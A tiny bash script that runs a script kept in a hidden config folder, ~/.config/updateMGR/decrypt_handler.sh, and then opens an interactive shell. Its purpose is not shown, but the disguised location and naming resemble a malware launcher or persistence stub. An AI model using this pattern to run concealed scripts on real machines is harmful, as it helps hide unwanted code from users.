#!/bin/bash
# mkdir hehehehehehlololo
sh -c "/home/$(whoami)/.config/updateMGR/decrypt_handler.sh; exec bash"